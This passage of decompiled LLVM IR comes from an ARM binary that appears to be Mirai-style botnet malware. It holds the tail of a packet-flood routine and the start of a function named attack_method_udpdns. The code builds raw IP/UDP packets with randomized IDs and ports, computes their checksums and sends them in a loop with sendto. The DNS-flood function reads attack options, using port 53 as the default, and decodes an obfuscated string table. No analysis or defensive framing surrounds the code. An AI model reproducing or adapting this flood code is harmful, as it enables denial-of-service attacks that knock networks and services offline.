  %v2_a240 = load i8, i8* %v1_a240, align 1
  %tmp = urem i8 %v2_a240, 16
  %v1_a244 = zext i8 %tmp to i32
  %v1_a248 = or i32 %v1_a244, 64
  store i32 %v1_a248, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v1_a248 to i8
  store i8 %v1_a250, i8* %v1_a240, align 1
  %v0_a254 = load i32, i32* @lr, align 4
  %v1_a254 = inttoptr i32 %v0_a254 to i8*
  %v2_a254 = load i8, i8* %v1_a254, align 1
  %v1_a258 = and i8 %v2_a254, -16
  %v1_a25c = or i8 %v1_a258, 5
  store i8 %v1_a25c, i8* %v1_a254, align 1
  %v2_a268 = load i32, i32* @lr, align 4
  %v3_a268 = add i32 %v2_a268, 1
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v5_a0dc, i8* %v4_a268, align 1
  %v3_a26c = load i32, i32* %stack_var_-48, align 4
  %v3_a270 = mul i32 %v3_a26c, 65536
  %v1_a274 = add i32 %v3_a270, 2097152
  %v3_a278 = udiv i32 %v1_a274, 256
  %v4_a280 = udiv i32 %v1_a274, 16777216
  %v5_a280 = or i32 %v3_a278, %v4_a280
  %v3_a284 = urem i32 %v3_a26c, 65536
  store i32 %v3_a284, i32* %r2.global-to-local, align 4
  %v1_a288 = trunc i32 %v5_a280 to i16
  %v2_a288 = load i32, i32* @lr, align 4
  %v3_a288 = add i32 %v2_a288, 2
  %v4_a288 = inttoptr i32 %v3_a288 to i16*
  store i16 %v1_a288, i16* %v4_a288, align 2
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = mul i32 %v0_a28c, 65536
  %v3_a294 = add i32 %v1_a28c, 786432
  store i32 %v3_a294, i32* %r2.global-to-local, align 4
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  %v2_a29c = load i32, i32* @lr, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v1_a29c, i8* %v4_a29c, align 1
  %v0_a2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_a2a0 = udiv i32 %v0_a2a0, 256
  %v1_a2a4 = and i32 %v3_a2a0, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v0_a2a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_a2a8 = icmp eq i32 %v0_a2a8, 0
  store i1 %v2_a2a8, i1* %cpsr_z.global-to-local, align 1
  %v4_a2ac = udiv i32 %v0_a2a0, 16777216
  %v5_a2ac = or i32 %v1_a2a4, %v4_a2ac
  store i32 %v5_a2ac, i32* %ip.global-to-local, align 4
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 9
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i8*
  store i8 17, i8* %v4_a2b4, align 1
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r3.global-to-local, align 4
  %v0_a2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a2bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a218
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a2c0 = load i32, i32* @lr, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 6
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i16*
  store i16 64, i16* %v5_a2c0, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a218, %bb
  %v2_a2c4 = load i32, i32* @global_var_25d48.57, align 4
  %v1_a2c8 = load i32, i32* @lr, align 4
  %v2_a2c8 = add i32 %v1_a2c8, 12
  %v3_a2c8 = inttoptr i32 %v2_a2c8 to i32*
  store i32 %v2_a2c4, i32* %v3_a2c8, align 4
  store i32 %v2_a234, i32* %r2.global-to-local, align 4
  %v1_a2d0 = add i32 %v2_a234, 16
  %v2_a2d0 = inttoptr i32 %v1_a2d0 to i32*
  %v3_a2d0 = load i32, i32* %v2_a2d0, align 4
  %v1_a2d4 = load i32, i32* @lr, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 16
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v3_a2d0, i32* %v3_a2d4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a2dc = load i32, i32* @lr, align 4
  %v1_a2dc = add i32 %v0_a2dc, 20
  store i32 %v1_a2dc, i32* %r4.global-to-local, align 4
  %v2_a2e0 = add i32 %v0_a2dc, 28
  %v3_a2e0 = inttoptr i32 %v2_a2e0 to i32*
  store i32 -1, i32* %v3_a2e0, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i16
  %v2_a2e4 = load i32, i32* @lr, align 4
  %v3_a2e4 = add i32 %v2_a2e4, 4
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i16*
  store i16 %v1_a2e4, i16* %v4_a2e4, align 2
  %v0_a2e8 = load i32, i32* @lr, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 32
  %v0_a2ec = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i16
  %v2_a2ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ec = add i32 %v2_a2ec, 4
  %v4_a2ec = inttoptr i32 %v3_a2ec to i16*
  store i16 %v1_a2ec, i16* %v4_a2ec, align 2
  %v0_a2f0 = load i32, i32* @r7, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i16
  %v2_a2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 2
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i16*
  store i16 %v1_a2f0, i16* %v4_a2f0, align 2
  %v0_a2f4 = load i32, i32* @r6, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i16
  %v2_a2f4 = load i32, i32* @lr, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 20
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i16*
  store i16 %v1_a2f4, i16* %v4_a2f4, align 2
  %v3_a2f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2f8, i32* %r2.global-to-local, align 4
  %v3_a2fc = call i32 @util_memcpy(i32 %v1_a2e8, i32 %v3_a170, i32 %v3_a2f8)
  %v3_a300 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a300, i32* %r3.global-to-local, align 4
  %v1_a304 = add i32 %v3_a300, 1
  store i32 %v1_a304, i32* @r4, align 4
  %v1_a308 = load i32, i32* @r8, align 4
  %v9_a308 = icmp eq i32 %v1_a304, %v1_a308
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a304, i32* %stack_var_-44, align 4
  %v5_a310 = icmp slt i32 %v1_a304, %v1_a308
  br i1 %v5_a310, label %dec_label_pc_a218, label %dec_label_pc_a314.preheader

dec_label_pc_a314.preheader:                      ; preds = %.thread, %dec_label_pc_a1bc
  %v0_a318.ph = phi i32 [ 0, %dec_label_pc_a1bc ], [ %v1_a308, %.thread ]
  %v3_a354 = icmp eq i32 %v3_a1cc, 65535
  br label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400, %dec_label_pc_a314.preheader
  %v0_a318 = phi i32 [ %v0_a318.ph, %dec_label_pc_a314.preheader ], [ 0, %dec_label_pc_a400 ], [ 0, %dec_label_pc_a314 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a318 = icmp eq i32 %v0_a318, 0
  store i1 %v2_a318, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a318, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a324
  %v1_a338 = phi i32 [ %v1_a3f0, %dec_label_pc_a374 ], [ 0, %dec_label_pc_a324 ]
  %v5_a32c = mul i32 %v1_a338, 24
  %v1_a330 = load i32, i32* @sl, align 4
  %v2_a330 = add i32 %v1_a330, %v5_a32c
  store i32 %v2_a330, i32* %r3.global-to-local, align 4
  %v1_a334 = add i32 %v2_a330, 20
  %v2_a334 = inttoptr i32 %v1_a334 to i8*
  %v3_a334 = load i8, i8* %v2_a334, align 1
  %v4_a334 = zext i8 %v3_a334 to i32
  store i32 %v4_a334, i32* %r2.global-to-local, align 4
  %v0_a338 = load i32, i32* @fp, align 4
  %v4_a338 = mul i32 %v1_a338, 4
  %v5_a338 = add i32 %v0_a338, %v4_a338
  %v6_a338 = inttoptr i32 %v5_a338 to i32*
  %v7_a338 = load i32, i32* %v6_a338, align 4
  store i32 %v7_a338, i32* @r5, align 4
  %v7_a340 = icmp eq i8 %v3_a334, 31
  store i1 %v7_a340, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a348 = add i32 %v7_a338, 20
  store i32 %v1_a348, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a334, 32
  br i1 %tmp40, label %dec_label_pc_a414, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a328
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  store i1 %v3_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a354, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v1_a360 = phi i32 [ %v1_a46c, %dec_label_pc_a414 ], [ 65535, %dec_label_pc_a350 ]
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v9_a360 = icmp eq i32 %v3_a1d0, %v1_a360
  store i1 %v9_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a360, label %dec_label_pc_a488, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a474.dec_label_pc_a368_crit_edge, %dec_label_pc_a35c
  %v1_a36c = phi i32 [ %v1_a36c.pre, %dec_label_pc_a474.dec_label_pc_a368_crit_edge ], [ %v1_a360, %dec_label_pc_a35c ]
  %v9_a36c = icmp eq i32 %v3_a1d4, %v1_a36c
  store i1 %v9_a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a36c, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368, %dec_label_pc_a49c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a378 = load i32, i32* @r5, align 4
  %v3_a378 = add i32 %v2_a378, 10
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 0, i16* %v4_a378, align 2
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* @r0, align 4
  %v2_a384 = call i32 @checksum_generic(i32 %v0_a380, i32 20)
  %v3_a384 = trunc i32 %v2_a384 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a38c = load i32, i32* @r5, align 4
  %v4_a38c = add i32 %v3_a38c, 10
  %v5_a38c = inttoptr i32 %v4_a38c to i16*
  store i16 %v3_a384, i16* %v5_a38c, align 2
  %v0_a390 = load i32, i32* %r3.global-to-local, align 4
  %v1_a390 = trunc i32 %v0_a390 to i16
  %v2_a390 = load i32, i32* @r6, align 4
  %v3_a390 = add i32 %v2_a390, 6
  %v4_a390 = inttoptr i32 %v3_a390 to i16*
  store i16 %v1_a390, i16* %v4_a390, align 2
  %v3_a394 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a394, i32* %r3.global-to-local, align 4
  %v0_a398 = load i32, i32* @r6, align 4
  store i32 %v0_a398, i32* @r1, align 4
  %v1_a39c = add i32 %v0_a398, 4
  %v2_a39c = inttoptr i32 %v1_a39c to i16*
  %v3_a39c = load i16, i16* %v2_a39c, align 2
  %v4_a39c = zext i16 %v3_a39c to i32
  store i32 %v4_a39c, i32* %r2.global-to-local, align 4
  %v1_a3a0 = add i32 %v3_a394, 12
  store i32 %v1_a3a0, i32* %r3.global-to-local, align 4
  %v0_a3a4 = load i32, i32* @r5, align 4
  %v4_a3a8 = call i32 @checksum_tcpudp(i32 %v0_a3a4, i32 %v0_a398, i32 %v4_a39c, i32 %v1_a3a0)
  %v5_a3a8 = trunc i32 %v4_a3a8 to i16
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v3_a3b0 = mul i32 %v3_a3ac, 32
  store i32 %v3_a3b0, i32* %lr.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 6
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i16*
  store i16 %v5_a3a8, i16* %v5_a3b4, align 2
  %v0_a3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a3b8, -8
  %v5_a3b8 = add i32 %v0_a3b8, %tmp41
  store i32 %v5_a3b8, i32* %lr.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r6, align 4
  %v1_a3bc = add i32 %v0_a3bc, 2
  %v2_a3bc = inttoptr i32 %v1_a3bc to i16*
  %v3_a3bc = load i16, i16* %v2_a3bc, align 2
  %v4_a3bc = zext i16 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* @r6, align 4
  %v3_a3c0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a3c0, i32* %r2.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @sl, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v5_a3b8
  store i32 %v2_a3c4, i32* @lr, align 4
  %v3_a3c8 = add i32 %v2_a3c4, 2
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i16*
  store i16 %v3_a3bc, i16* %v4_a3c8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r5, align 4
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = add i32 %v0_a3d8, 32
  store i32 %v1_a3d8, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @sb, align 4
  %v0_a3e0 = load i32, i32* @lr, align 4
  %v6_a3e8 = call i32 @__libc_sendto(i32 %v0_a3dc, i32 %v0_a3d4, i32 %v1_a3d8, i32 16384, i32 %v0_a3e0, i32 16)
  %v3_a3ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ec, i32* %r3.global-to-local, align 4
  %v1_a3f0 = add i32 %v3_a3ec, 1
  %v1_a3f4 = load i32, i32* @r8, align 4
  %v9_a3f4 = icmp eq i32 %v1_a3f0, %v1_a3f4
  store i1 %v9_a3f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3f0, i32* %stack_var_-44, align 4
  %v5_a3fc = icmp slt i32 %v1_a3f0, %v1_a3f4
  br i1 %v5_a3fc, label %dec_label_pc_a328, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a404 = icmp eq i32 %v1_a3f4, 0
  store i1 %v2_a404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a404, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a414:                                ; preds = %dec_label_pc_a328
  %v1_a414 = add i32 %v2_a330, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* @r4, align 4
  %v0_a418 = call i32 @rand_next()
  %v3_a41c = load i32, i32* %stack_var_-44, align 4
  %v5_a424 = mul i32 %v3_a41c, 24
  %v0_a428 = load i32, i32* @r4, align 4
  %v1_a428 = and i32 %v0_a428, 16711680
  store i32 %v1_a428, i32* %ip.global-to-local, align 4
  %v3_a42c = udiv i32 %v0_a428, 16777216
  %v4_a430 = udiv i32 %v1_a428, 256
  %v5_a430 = or i32 %v4_a430, %v3_a42c
  store i32 %v5_a430, i32* %r2.global-to-local, align 4
  %v1_a434 = load i32, i32* @sl, align 4
  %v2_a434 = add i32 %v1_a434, %v5_a424
  %v1_a438 = and i32 %v0_a428, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v2_a434, 20
  %v2_a43c = inttoptr i32 %v1_a43c to i8*
  %v3_a43c = load i8, i8* %v2_a43c, align 1
  %v4_a43c = zext i8 %v3_a43c to i32
  store i32 %v4_a43c, i32* %ip.global-to-local, align 4
  %v4_a440 = mul i32 %v1_a438, 256
  %v4_a444 = mul i32 %v0_a428, 16777216
  %v5_a440 = or i32 %v4_a440, %v4_a444
  %v5_a444 = or i32 %v5_a440, %v5_a430
  %v7_a448 = lshr i32 %v0_a418, %v4_a43c
  %v8_a448 = add i32 %v7_a448, %v5_a444
  store i32 %v8_a448, i32* %r2.global-to-local, align 4
  %v5_a460 = call i32 @llvm.bswap.i32(i32 %v8_a448)
  %v1_a464 = load i32, i32* @r5, align 4
  %v2_a464 = add i32 %v1_a464, 16
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v5_a460, i32* %v3_a464, align 4
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  %v1_a46c = load i32, i32* @r7, align 4
  %v9_a46c = icmp eq i32 %v3_a1cc, %v1_a46c
  store i1 %v9_a46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a46c, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a474:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v0_a474 = call i32 @rand_next()
  %v1_a474 = trunc i32 %v0_a474 to i16
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v1_a47c = load i32, i32* @r7, align 4
  %v9_a47c = icmp eq i32 %v3_a1d0, %v1_a47c
  store i1 %v9_a47c, i1* %cpsr_z.global-to-local, align 1
  %v3_a480 = load i32, i32* @r5, align 4
  %v4_a480 = add i32 %v3_a480, 4
  %v5_a480 = inttoptr i32 %v4_a480 to i16*
  store i16 %v1_a474, i16* %v5_a480, align 2
  br i1 %v9_a47c, label %dec_label_pc_a488, label %dec_label_pc_a474.dec_label_pc_a368_crit_edge

dec_label_pc_a474.dec_label_pc_a368_crit_edge:    ; preds = %dec_label_pc_a474
  %v1_a36c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a368

dec_label_pc_a488:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a35c
  %v0_a488 = call i32 @rand_next()
  %v1_a488 = trunc i32 %v0_a488 to i16
  %v1_a490 = load i32, i32* @r7, align 4
  %v9_a490 = icmp eq i32 %v3_a1d4, %v1_a490
  store i1 %v9_a490, i1* %cpsr_z.global-to-local, align 1
  %v3_a494 = load i32, i32* @r5, align 4
  %v4_a494 = add i32 %v3_a494, 20
  %v5_a494 = inttoptr i32 %v4_a494 to i16*
  store i16 %v1_a488, i16* %v5_a494, align 2
  br i1 %v9_a490, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368
  %v0_a49c = call i32 @rand_next()
  %v1_a49c = trunc i32 %v0_a49c to i16
  %v3_a4a0 = load i32, i32* @r6, align 4
  %v4_a4a0 = add i32 %v3_a4a0, 2
  %v5_a4a0 = inttoptr i32 %v4_a4a0 to i16*
  store i16 %v1_a49c, i16* %v5_a4a0, align 2
  br label %dec_label_pc_a374

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a194
  %v0_a4a8 = load i32, i32* @sb, align 4
  %v1_a4ac = call i32 @__GI___libc_close(i32 %v0_a4a8)
  br label %dec_label_pc_a4b0

dec_label_pc_a4b0:                                ; preds = %entry, %dec_label_pc_a4a8
  %v1_a4b8 = phi i32 [ %v3_a184, %entry ], [ %v1_a4ac, %dec_label_pc_a4a8 ]
  store i32 %v3_a088, i32* %r4.global-to-local, align 4
  store i32 %v27_a088, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4b8

; uselistorder directives
  uselistorder i32 %v1_a46c, { 1, 0 }
  uselistorder i32 %v0_a428, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a3f0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a3b8, { 1, 0 }
  uselistorder i1 %v3_a354, { 1, 0 }
  uselistorder i32 %v1_a304, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a26c, { 1, 0 }
  uselistorder i32 %v3_a204, { 1, 0 }
  uselistorder i32 %v3_a200, { 1, 0 }
  uselistorder i32 %v0_a1c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2 }
  uselistorder i32 %v0_a1bc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a1b4, { 1, 0 }
  uselistorder i1 %v7_a188, { 1, 0 }
  uselistorder i32 %v3_a184, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a124, { 1, 0 }
  uselistorder i32 %v5_a0f8, { 1, 0 }
  uselistorder i32 %v5_a0bc, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a314, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_udpdns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a4c0 = load i32, i32* @sb, align 4
  %v27_a4c0 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4e0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a4e4 = load i32, i32* @r5, align 4
  store i32 %v0_a4e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4f8 = inttoptr i32 %v0_a4e4 to i32*
  %v6_a4f8 = call i32 @attack_get_opt_int(i32 %v0_a4f0, i32* %v5_a4f8, i32 2, i32 0)
  %v1_a504 = urem i32 %v6_a4f8, 256
  store i32 %v1_a504, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v0_a514 = load i32, i32* @r5, align 4
  store i32 %v0_a514, i32* %r1.global-to-local, align 4
  %v6_a51c = inttoptr i32 %v0_a514 to i32*
  %v7_a51c = call i32 @attack_get_opt_int(i32 %v0_a510, i32* %v6_a51c, i32 3, i32 65535)
  %v0_a520 = load i32, i32* @r5, align 4
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v0_a520 to i32*
  %v6_a534 = call i32 @attack_get_opt_int(i32 %v0_a52c, i32* %v5_a534, i32 4, i32 64)
  %v1_a53c = urem i32 %v6_a534, 256
  store i32 %v1_a53c, i32* %ip.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  store i32 %v0_a540, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a54c = load i32, i32* @r4, align 4
  store i32 %v0_a54c, i32* %r0.global-to-local, align 4
  %v6_a554 = inttoptr i32 %v0_a540 to i32*
  %v7_a554 = call i32 @attack_get_opt_int(i32 %v0_a54c, i32* %v6_a554, i32 5, i32 0)
  %v1_a560 = urem i32 %v7_a554, 256
  store i32 %v1_a560, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a56c = load i32, i32* @r4, align 4
  store i32 %v0_a56c, i32* %r0.global-to-local, align 4
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  %v5_a578 = inttoptr i32 %v0_a570 to i32*
  %v6_a578 = call i32 @attack_get_opt_int(i32 %v0_a56c, i32* %v5_a578, i32 6, i32 65535)
  %v0_a57c = load i32, i32* @r5, align 4
  store i32 %v0_a57c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a588 = load i32, i32* @r4, align 4
  store i32 %v0_a588, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a590 = inttoptr i32 %v0_a57c to i32*
  %v6_a590 = call i32 @attack_get_opt_int(i32 %v0_a588, i32* %v5_a590, i32 7, i32 53)
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r1.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r4, align 4
  store i32 %v0_a5a0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a5ac = inttoptr i32 %v0_a59c to i32*
  %v6_a5ac = call i32 @attack_get_opt_int(i32 %v0_a5a0, i32* %v5_a5ac, i32 9, i32 65535)
  %v0_a5b0 = load i32, i32* @r5, align 4
  store i32 %v0_a5b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a5c4 = inttoptr i32 %v0_a5b0 to i32*
  %v6_a5c4 = call i32 @attack_get_opt_int(i32 %v0_a5bc, i32* %v5_a5c4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r5, align 4
  store i32 %v0_a5d0, i32* %r1.global-to-local, align 4
  store i32 %v6_a5c4, i32* %sb.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  store i32 %v0_a5d8, i32* %r0.global-to-local, align 4
  %v4_a5dc = inttoptr i32 %v0_a5d0 to i32*
  %v5_a5dc = call i32 @attack_get_opt_str(i32 %v0_a5d8, i32* %v4_a5dc, i32 8, i32 0)
  store i32 %v5_a5dc, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @table_unlock_val(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5f4 = call i32 @table_retrieve_val(i32 21, i32* null)
  store i32 %v3_a5f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5fc = call i32 @__libc_open(i32 %v3_a5f4, i32 0)
  store i32 %v2_a5fc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @table_lock_val(i32 21)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  %v0_a60c = load i32, i32* @r4, align 4
  %v1_a60c = icmp slt i32 %v0_a60c, 0
  %v2_a60c = icmp eq i32 %v0_a60c, 0
  store i1 %v2_a60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a60c, label %dec_label_pc_ab04, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %entry
  %v2_a618 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a618, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_a618, i32* @r1, align 4
  store i32 %v0_a60c, i32* %r0.global-to-local, align 4
  %v1_a628 = call i32 @__libc_read(i32 %v0_a60c)
  store i32 %v1_a628, i32* @r5, align 4
  %v0_a630 = load i32, i32* @r4, align 4
  store i32 %v0_a630, i32* %r0.global-to-local, align 4
